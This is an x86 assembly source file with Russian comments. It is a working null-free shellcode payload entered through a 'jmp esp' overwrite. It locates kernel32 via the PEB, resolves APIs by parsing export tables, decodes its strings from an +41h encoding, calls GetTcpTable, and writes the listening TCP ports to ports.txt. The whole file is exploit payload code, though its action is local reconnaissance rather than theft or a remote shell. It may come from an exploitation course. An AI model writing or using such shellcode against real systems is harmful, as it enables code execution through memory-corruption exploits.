BITS 32

; --- переменные кадра (смещения < 80h - так команды короче) ------------------
%define  V_GPA        0x00     ; адрес GetProcAddress
%define  V_CREATE     0x04     ; адрес CreateFileA
%define  V_WRITE      0x08     ; адрес WriteFile
%define  V_TCPTBL     0x0C     ; адрес GetTcpTable
%define  V_SIZE       0x10     ; pdwSize
%define  V_HFILE      0x14     ; hFile
%define  V_WRITTEN    0x18     ; lpNumberOfBytesWritten
%define  V_ROW        0x1C     ; текущая строка таблицы
%define  V_END        0x20     ; счётчик оставшихся строк
%define  V_TBL        0x24     ; указатель на таблицу TCP
%define  V_STR        0x28     ; база декодированных строк
%define  V_MOD        0x2C     ; база kernel32.dll
%define  B_OUT        0x30     ; буфер вывода: номера портов через CRLF

%define  STR_WORDS    26       ; слов в блоке строк

; --- где какая строка лежит --------------------------------------------------
%define  S_PORTS      0x00     ; "ports.txt" (адрес = база строк)
%define  S_IPH        0x0C     ; "iphlpapi.dll"
%define  S_CF         0x1C     ; "CreateFileA"
%define  S_WF         0x28     ; "WriteFile"
%define  S_LLA        0x34     ; "LoadLibraryA"
%define  S_GPA        0x44     ; "GetProcAddress"
%define  S_GCT        0x54     ; "GetTcpTable"

%define  TCPROW_SIZE     20    ; sizeof(MIB_TCPROW)
%define  TCPROW_PORT     8     ; dwLocalPort
%define  TCPSTATE_LISTEN 2     ; MIB_TCP_STATE_LISTEN


; LOOKUP <куда>, <смещение строки>, <длина имени>
; Ищет функцию в таблице экспорта DLL (EBP - база DLL).
; Найденный адрес кладёт в ячейку кадра <куда>.
%macro LOOKUP 3
    mov  eax, [ebp + 3Ch]                       ; смещение PE-заголовка
    add  eax, ebp                               ; EAX указывает на PE-заголовок
    mov  eax, [eax + 78h]                       ; адрес таблицы экспорта
    add  eax, ebp                               ; EAX = таблица экспорта
    mov  esi, [eax + 1Ch]                       ; адреса функций
    add  esi, ebp
    mov  edi, [eax + 20h]                       ; имена функций
    add  edi, ebp
    mov  ebx, [eax + 24h]                       ; порядковые номера имён
    add  ebx, ebp

    push ebx                                    ; сохраняем на стеке:
    push edi                                    ; номера,
    push esi                                    ; имена,
    push dword [eax + 18h]                      ; адреса и число имён
    xor  esi, esi                               ; начинаем с первого имени
%%loop:
    mov  edi, [esp + 8]                         ; где лежит таблица имён
    mov  edi, [edi + esi*4]                     ; берём очередное имя
    add  edi, ebp                               ; EDI указывает на имя

    push esi                                    ; сохраняем ESI и EDI:
    push edi                                    ; cmpsb изменит оба
    mov  esi, [esp + 24 + V_STR]                ; где лежат строки
    add  esi, %2                                ; искомое имя
    push %3
    pop  ecx                                    ; сколько байт сравнивать
    cld                                         ; сравниваем вперёд
    repe cmpsb                                  ; все байты совпали?
    pop  edi                                    ; вернули EDI
    pop  esi                                    ; вернули ESI
    jz   %%found

    inc  esi                                    ; проверяем следующее имя
    cmp  esi, [esp]                             ; имена кончились?
    jb   %%loop
    xor  eax, eax                               ; функцию не нашли
    jmp  %%done

%%found:
    mov  edi, [esp + 12]                        ; номера имён
    movzx eax, word [edi + esi*2]               ; номер найденного имени
    mov  edi, [esp + 4]                         ; адреса функций
    mov  eax, [edi + eax*4]                     ; адрес функции
    add  eax, ebp                               ; прибавили базу DLL

%%done:
    add  esp, 10h                               ; убрали служебные данные
    mov  [esp + %1], eax                        ; сохранили адрес
%endmacro


; Точка входа: сюда приводит jmp esp.
; Перепрыгиваем DEC, чтобы не исполнять её как обычный код.
shellcode:
    jmp  short body

; DEC переводит число из EAX в десятичные цифры по адресу EDI.
DEC:
    mov  ebx, esp                               ; запомнили, где был стек
    push 0Ah
    pop  ecx                                    ; делитель - 10
.d:
    xor  edx, edx                               ; обнулили остаток
    div  ecx                                    ; EAX = частное, EDX = остаток
    push edx                                    ; очередная цифра - в стек
    mov  edx, ebx
    sub  edx, esp                               ; сколько цифр уже набрали
    cmp  edx, 24                                ; 6 цифр хватит с запасом
    ja   .digits                                ; больше не делим
    test eax, eax
    jnz  .d                                     ; пока есть частное
.digits:
    cmp  esp, ebx
    jz   .done
    pop  eax
    add  al, '0'                                ; цифра -> символ
    mov  [edi], al
    inc  edi                                    ; следующий символ
    jmp  .digits
.done:
    ret

body:
    ; Кладём строки в стек закодированными +41h - так в файле нет нулей.
    push dword 0x41414141                       ; паддинг после "GetTcpTable"
    push dword 0x41414141                       ; (8 нулевых байт)
    push dword 0x41A6ADA3                       ; "ble\0"
    push dword 0xA295B1A4                       ; "cpTa"
    push dword 0x95B5A688                       ; "GetT"
    push dword 0x8241B4B4                       ; "ss\0" + паддинг
    push dword 0xA6B3A5A5                       ; "ddre"
    push dword 0x82A4B0B3                       ; "rocA"
    push dword 0x91B5A688                       ; "GetP"
    push dword 0x82828241                       ; NUL + паддинг
    push dword 0x82BAB3A2                       ; "aryA"
    push dword 0xB3A3AA8D                       ; "Libr"
    push dword 0xA5A2B08D                       ; "Load"
    push dword 0x828241A6                       ; "e\0" + паддинг
    push dword 0xADAA87A6                       ; "eFil"
    push dword 0xB5AAB398                       ; "Writ"
    push dword 0x4182A6AD                       ; "leA\0"
    push dword 0xAA87A6B5                       ; "teFi"
    push dword 0xA2A6B384                       ; "Crea"
    push dword 0x82828241                       ; NUL + паддинг
    push dword 0xADADA56F                       ; ".dll"
    push dword 0xAAB1A2B1                       ; "papi"
    push dword 0xADA9B1AA                       ; "iphl"
    push dword 0x828241B5                       ; "t\0" + паддинг
    push dword 0xB9B56FB4                       ; "s.tx"
    push dword 0xB5B3B0B1                       ; "port"

    ; Декодируем строки: вычитаем 41h из каждого байта.
    mov  edi, esp                               ; EDI = начало строк
    push STR_WORDS
    pop  ecx                                    ; 26 слов
decode:
    mov  eax, [edi]
    sub  eax, 0x41414141                        ; убираем кодировку
    mov  [edi], eax
    add  edi, 4
    dec  ecx
    jnz  decode

    ; Резервируем 8 КБ на стеке под переменные и таблицу портов.
    ; Строки лежат сразу над кадром - их адрес сохраняем.
    push 2
    pop  ecx
    shl  ecx, 12                                ; 2 << 12 = 8 КБ
    sub  esp, ecx                               ; ESP теперь указывает на кадр
    mov  eax, esp
    xor  edx, edx
    mov  dh, 20h                                ; 0x2000 = 8 КБ
    add  eax, edx                               ; адрес строк = ESP + 8 КБ
    mov  [esp + V_STR], eax                     ; запомнили, где строки

    ; Ищем kernel32.dll среди уже загруженных библиотек.
    ; В списке сначала ntdll, потом kernelbase, потом kernel32.
    xor  esi, esi                               ; обнуляем ESI
    mov  eax, [fs:esi + 30h]                    ; EAX = PEB
    mov  eax, [eax + 0Ch]                       ; EAX = список загруженных DLL
    mov  esi, [eax + 0Ch]                       ; ESI = первый модуль (ntdll)
    lodsd                                       ; EAX = ссылка на следующий модуль
    xchg eax, esi                               ; ESI = kernelbase
    lodsd                                       ; EAX = ссылка на следующий модуль
    xchg eax, esi                               ; ESI = kernel32
    mov  ebp, [esi + 18h]                       ; EBP = адрес kernel32 в памяти
    mov  [esp + V_MOD], ebp                     ; запомнили базу kernel32

    ; Ищем GetProcAddress в таблице экспорта kernel32.
    LOOKUP V_GPA, S_GPA, 14
    mov  ebx, [esp + V_GPA]                     ; EBX = GetProcAddress
    test ebx, ebx
    jnz  gpa_ok
    int3                                        ; не нашли - останавливаемся
gpa_ok:

    ; Получаем адреса нужных функций.
    ; Аргументы кладём справа налево, как требует stdcall.
    mov  ebp, [esp + V_STR]                     ; EBP = база строк
    mov  edi, [esp + V_MOD]                     ; EDI = база kernel32

    ; GetProcAddress(kernel32, "CreateFileA")
    push ebp
    add  dword [esp], S_CF
    push edi
    call ebx
    mov  [esp + V_CREATE], eax                  ; адрес CreateFileA

    ; GetProcAddress(kernel32, "WriteFile")
    push ebp
    add  dword [esp], S_WF
    push edi
    call ebx
    mov  [esp + V_WRITE], eax                   ; адрес WriteFile

    ; GetProcAddress(kernel32, "LoadLibraryA")
    push ebp
    add  dword [esp], S_LLA
    push edi
    call ebx
    mov  esi, eax                               ; запомнили адрес LoadLibraryA

    ; LoadLibraryA("iphlpapi.dll") - модуль нужен для GetTcpTable
    push ebp
    add  dword [esp], S_IPH
    call esi
    mov  edi, eax                               ; EDI = библиотека iphlpapi.dll

    ; GetProcAddress(iphlpapi, "GetTcpTable")
    push ebp
    add  dword [esp], S_GCT
    push edi
    call ebx
    mov  [esp + V_TCPTBL], eax                  ; адрес GetTcpTable
    test eax, eax
    jnz  have_tbl
    int3
have_tbl:

    ; Просим Windows заполнить таблицу TCP-соединений.
    xor  eax, eax
    mov  ah, 1                                  ; EAX = 0x100 (смещение буфера)
    add  eax, esp                               ; получили адрес буфера
    mov  [esp + V_TBL], eax                     ; сохранили адрес таблицы
    xor  ecx, ecx
    mov  ch, 10h                                ; ECX = 0x1000 (4 КБ)
    mov  [esp + V_SIZE], ecx                    ; сохранили размер буфера
    mov  edx, [esp + V_TCPTBL]                  ; адрес GetTcpTable
    xor  ecx, ecx
    push ecx                                    ; не сортировать строки
    lea  eax, [esp + 4 + V_SIZE]                ; адрес переменной с размером
    push eax                                    ; сюда Windows вернёт размер
    push dword [esp + 8 + V_TBL]                ; куда писать таблицу
    call edx                                    ; GetTcpTable(...)
    test eax, eax
    jz   tcp_ok
    int3                                        ; ошибка: таблицу не дали
tcp_ok:

    ; Создаём ports.txt и открываем его только на запись.
    ; Аргументы CreateFileA кладутся справа налево.
    mov  edx, [esp + V_CREATE]                  ; адрес CreateFileA
    xor  eax, eax
    push eax                                    ; шаблон файла не нужен
    mov  al, 80h
    push eax                                    ; обычный файл
    push 2                                      ; если существует - перезаписать
    xor  eax, eax
    push eax                                    ; без специальной защиты
    push 1                                      ; разрешить другим читать
    xor  eax, eax
    mov  al, 1
    shl  eax, 1Eh                               ; доступ только на запись
    push eax
    push dword [esp + 24 + V_STR]               ; имя файла
    call edx                                    ; CreateFileA(...)
    cmp  eax, -1                                ; не удалось открыть?
    jnz  file_ok
    int3                                        ; не смогли создать файл
file_ok:
    mov  [esp + V_HFILE], eax                   ; сохранили дескриптор файла

    ; Разбираем таблицу TCP.
    ; Сначала идёт число строк, затем строки по 20 байт:
    ; в начале строки состояние, а номер порта - со смещением 8.
    mov  eax, [esp + V_TBL]                     ; начало таблицы
    mov  ecx, [eax]                             ; число строк
    mov  [esp + V_END], ecx                     ; сколько осталось обработать
    add  eax, 4                                 ; пропускаем число строк
    mov  [esp + V_ROW], eax                     ; адрес первой строки
    lea  edi, [esp + B_OUT]                     ; сюда пишем номера портов

nextrow:
    mov  eax, [esp + V_END]                     ; все строки обработали?
    test eax, eax
    jz   write_out
    mov  esi, [esp + V_ROW]                     ; текущая строка
    cmp  dword [esi], TCPSTATE_LISTEN           ; это слушающий сокет?
    jnz  rowdone
    mov  ax, [esi + TCPROW_PORT]                ; берём номер порта
    xchg al, ah                                 ; меняем байты местами
    movzx eax, ax                               ; теперь EAX = номер порта
    call DEC                                    ; записываем номер цифрами
    mov  word [edi], 0A0Dh                      ; после номера - перевод строки
    add  edi, 2

rowdone:
    add  dword [esp + V_ROW], TCPROW_SIZE       ; переходим к следующей строке
    dec  dword [esp + V_END]                    ; одну строку обработали
    jmp  nextrow

    ; Считаем длину текста и пишем всё одной WriteFile.
    ; Если ни одного порта не нашли, файл останется пустым.
write_out:
    lea  eax, [esp + B_OUT]                     ; начало текста
    mov  ecx, edi
    sub  ecx, eax                               ; длина текста
    jz   finish                                 ; писать нечего
    mov  edx, [esp + V_WRITE]                   ; адрес WriteFile
    xor  ebx, ebx
    push ebx                                    ; без асинхронности
    lea  ebx, [esp + 4 + V_WRITTEN]             ; сюда вернётся число байт
    push ebx
    push ecx                                    ; сколько байт писать
    push eax                                    ; откуда брать текст
    push dword [esp + 16 + V_HFILE]             ; в какой файл
    call edx                                    ; WriteFile(...)
finish:
    ; Файл записан; int3 завершит процесс.
    int3
